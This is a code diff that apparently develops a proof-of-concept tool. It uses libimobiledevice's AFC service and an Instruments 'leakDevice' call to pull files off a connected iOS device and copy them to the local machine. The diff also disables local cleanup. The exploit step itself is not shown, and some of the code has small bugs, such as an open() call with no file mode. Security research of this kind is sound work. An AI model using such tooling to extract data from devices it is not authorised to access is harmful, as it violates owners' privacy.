@@ -1,6 +1,7 @@
 #include <assert.h>
 #include <ftw.h>
 #include <stdio.h>
+#include <string.h>
 
 #include <libimobiledevice/afc.h>
 #include <libimobiledevice/libimobiledevice.h>
@@ -11,7 +12,7 @@
 
 #define LABEL "cc"
 
-#define LOG(fmt, ...) fprintf(stderr, "[+] " fmt "\n", __VA_ARGS__)
+#define LOG(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
 
 #define DEV_OK(expr) assert(expr == IDEVICE_E_SUCCESS)
 #define LD_OK(expr) assert(expr == LOCKDOWN_E_SUCCESS)
@@ -22,26 +23,59 @@
   if (err != AFC_E_SUCCESS)                                                                                            \
     return err;
 
-afc_error_t afc_cp_file(afc_client_t afc, const char *remote, const char *lcoal) { return AFC_E_SUCCESS; }
+afc_error_t afc_cp_file(afc_client_t afc, const char *remote, const char *local) {
+  afc_error_t err = AFC_E_SUCCESS;
+  uint64_t handle = 0;
+  AFC_CHECK(afc_file_open(afc, remote, AFC_FOPEN_RDONLY, &handle));
+
+  int fd = open(local, O_CREAT | O_APPEND | O_RDWR);
+  if (fd == -1) {
+    LOG("FATAL ERROR: could not open local file '%s' for writing", local);
+    return AFC_E_IO_ERROR;
+  }
+
+  LOG("download: %s -> %s", remote, local);
+  char buf[1024 * 1024 * 4];
+  uint32_t bytes_read = 0;
+  while (TRUE) {
+    AFC_CHECK(afc_file_read(afc, handle, buf, sizeof buf, &bytes_read));
+    if (bytes_read > 0)  {
+      write(fd, buf, bytes_read);
+    } else {
+      break;
+    }
+  }
+
+  afc_file_close(afc, handle);
+  close(fd);
+  return err;
+}
 
 afc_error_t afc_cp_dir(afc_client_t afc, const char *remote, const char *local) {
   char **list = NULL;
-  afc_error_t err = 0;
-
-  AFC_CHECK(afc_read_directory(afc, remote, &list));
-
+  afc_error_t err = AFC_E_SUCCESS;
+  int count = 0;
   char remote_name[PATH_MAX];
   char local_name[PATH_MAX];
+  AFC_CHECK(afc_read_directory(afc, remote, &list));
+
   char **p = list;
   while (*p) {
-    snprintf(remote_name, sizeof(remote_name), "%s/%s", remote, *p);
-    puts(remote_name);
+    if (strcmp(*p, "..") == 0 || strcmp(*p, ".") == 0) {
+      goto next;
+    }
+
+    count = snprintf(remote_name, sizeof remote_name, "%s/%s", remote, *p);
+    assert(count >= 0 && count < sizeof remote_name);
     snprintf(local_name, sizeof(local_name), "%s/%s", local, *p);
-    puts(local_name);
+    assert(count >= 0 && count < sizeof local_name);
+    afc_cp_file(afc, remote_name, local_name);
+
+next:
     p++;
   }
   afc_dictionary_free(list);
-  return AFC_E_SUCCESS;
+  return err;
 }
 
 void leak(const char *remote) {
@@ -50,7 +84,7 @@ void leak(const char *remote) {
     Instruments *api = [[Instruments alloc] init];
     XRRemoteDevice *device = [api devices].firstObject;
     NSString *leaked = [api leakDevice:device to:path];
-    NSLog(@"%@", leaked);
+    printf("%s\n", leaked.UTF8String);
   }
 }
 
@@ -91,14 +125,15 @@ int main(int argc, char *argv[]) {
 
   // mess up
   AFC_OK(afc_make_directory(afc, remote));
-  printf("%s\n", remote);
+  printf("%s/", local);
   leak(remote);
-  getchar();
+  // getchar();
   // cp -r
+  afc_cp_dir(afc, remote, local);
 
   // cleanup
   AFC_OK(afc_remove_path_and_contents(afc, remote));
-  nftw(local, rm, 10, FTW_DEPTH|FTW_MOUNT|FTW_PHYS);
+  // nftw(local, rm, 10, FTW_DEPTH|FTW_MOUNT|FTW_PHYS);
 
 cleanup:
   lockdownd_client_free(lockdown);
